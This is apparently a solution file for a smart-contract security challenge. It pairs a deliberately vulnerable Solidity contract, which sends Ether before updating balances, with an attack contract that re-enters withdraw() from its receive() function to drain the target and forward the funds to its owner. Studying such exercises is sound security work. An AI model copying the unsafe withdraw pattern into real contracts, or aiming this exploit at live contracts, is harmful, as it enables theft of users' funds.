// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
contract reAttack{

    Reentrance reInstance;
    uint amount_donated = 2000000000000000;

    constructor(address payable _instanceAddress){
        reInstance = Reentrance(_instanceAddress);
    }

    function withdrawAttack(uint _amount) public payable {
        reInstance.withdraw(_amount);
    }

    function withdrawRemaining() public payable{
        uint totalBalance = address(this).balance;
        (bool sent, ) = msg.sender.call{value: totalBalance}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {
      if (address(reInstance).balance != 0 ) {
        reInstance.withdraw(amount_donated); 
      }
    }

}